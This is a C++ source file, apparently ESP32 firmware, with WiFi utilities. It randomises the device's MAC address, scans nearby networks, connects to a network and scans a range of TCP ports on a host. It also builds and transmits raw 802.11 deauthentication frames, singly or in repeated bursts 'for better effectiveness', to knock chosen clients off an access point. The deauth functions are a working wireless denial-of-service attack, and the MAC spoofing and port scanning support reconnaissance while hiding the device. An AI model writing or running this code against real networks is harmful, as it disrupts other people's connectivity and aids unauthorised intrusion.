// wifi_utils.cpp
#include "wifi_utils.h"

WiFi_Utils::WiFi_Utils(bool random_mac) : random_mac_enable(random_mac)
{
}

bool WiFi_Utils::init()
{
  if (random_mac_enable)
  {
    isInit = changeMACAddress();
  }
  else
  {
    isInit = true;
  }
  return isInit;
}

bool WiFi_Utils::changeMACAddress()
{
  uint8_t mac[6];
  randomSeed(analogRead(0));
  for (int i = 0; i < 6; i++)
  {
    mac[i] = random(0, 256);
  }

  mac[0] = (mac[0] & 0xFC) | 0x02;

  WiFi.mode(WIFI_STA);

  if (esp_wifi_set_mac(WIFI_IF_STA, mac) == ESP_OK)
  {
    mac_address = WiFi.macAddress().c_str();
    return true;
  }
  else
  {
    return false;
  }
}

wifiData WiFi_Utils::scanWifiList()
{
  wifiData wifi_;
  WiFi.mode(WIFI_STA);
  int numWifi = WiFi.scanNetworks();
  wifi_.num = numWifi;
  if (numWifi == 0)
  {
    return wifi_;
  }
  else
  {
    for (int i = 0; i < numWifi; i++)
    {
      wifi_.ssid.push_back(std::string(WiFi.SSID(i).c_str()));
      wifi_.bssid.push_back(std::string(WiFi.BSSIDstr(i).c_str()));
      wifi_.channel.push_back(WiFi.channel(i));
      wifi_.signal.push_back(WiFi.RSSI(i));
    }
    return wifi_;
  }
}

bool WiFi_Utils::connectToWifi(std::string SSID, std::string PASSWORD, std::string HOSTNAME, const int MAX_ATTEMPTS,
                               const int TRIAL_DELAY)
{
  WiFi.mode(WIFI_STA);
  WiFi.config(INADDR_NONE, INADDR_NONE, INADDR_NONE, INADDR_NONE);
  WiFi.setHostname(HOSTNAME.c_str());
  WiFi.begin(SSID.c_str(), PASSWORD.c_str());

  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < MAX_ATTEMPTS)
  {
    delay(TRIAL_DELAY);
    attempts++;
  }

  if (WiFi.status() == WL_CONNECTED)
  {
    return true;
  }
  else
  {
    return false;
  }
  return false;
}

bool WiFi_Utils::scanSinglePort(IPAddress ip, int port, int timeout_ms)
{
  WiFiClient client;
  client.setTimeout(timeout_ms);
  if (client.connect(ip, port))
  {
    client.stop();
    return true;
  }
  return false;
}

std::vector<int> WiFi_Utils::scanPortsInRange(IPAddress ip, int startPort, int endPort, int timeout_ms)
{
  std::vector<int> openPorts;

  for (int port = startPort; port <= endPort; ++port)
  {
    if (scanSinglePort(ip, port, timeout_ms))
    {
      openPorts.push_back(port);
    }
    delay(50);
  }
  return openPorts;
}

void WiFi_Utils::sendDeauthPacket(const uint8_t* bssid, const uint8_t* sta)
{
  // Deauthentication frame structure (IEEE 802.11)
  struct
  {
    uint8_t frame_control[2];
    uint8_t duration[2];
    uint8_t addr1[6];  // Destination (client)
    uint8_t addr2[6];  // Source (AP)
    uint8_t addr3[6];  // BSSID (AP)
    uint8_t sequence_control[2];
    uint8_t reason_code[2];
  } __attribute__((packed)) deauth_frame;

  // Frame Control: Type=Management(00), Subtype=Deauth(1100)
  deauth_frame.frame_control[0] = 0xC0;  // Deauth frame type
  deauth_frame.frame_control[1] = 0x00;  // No flags
  
  deauth_frame.duration[0] = 0x00;
  deauth_frame.duration[1] = 0x00;
  
  memcpy(deauth_frame.addr1, sta, 6);    // Destination: Client MAC
  memcpy(deauth_frame.addr2, bssid, 6);  // Source: AP MAC
  memcpy(deauth_frame.addr3, bssid, 6);  // BSSID: AP MAC
  
  deauth_frame.sequence_control[0] = 0x00;
  deauth_frame.sequence_control[1] = 0x00;
  
  deauth_frame.reason_code[0] = 0x01;  // Reason: Unspecified
  deauth_frame.reason_code[1] = 0x00;

  // Send the deauth packet
  esp_wifi_80211_tx(WIFI_IF_AP, (uint8_t*)&deauth_frame, sizeof(deauth_frame), false);
}

void WiFi_Utils::sendDeauthBurst(const uint8_t* bssid, const uint8_t* sta, int count, int delay_ms)
{
  // Send multiple deauth packets for better effectiveness
  for (int i = 0; i < count; i++)
  {
    sendDeauthPacket(bssid, sta);
    if (delay_ms > 0 && i < count - 1)
    {
      delay(delay_ms);
    }
  }
}

std::string WiFi_Utils::macAddress()
{
  return mac_address;
}
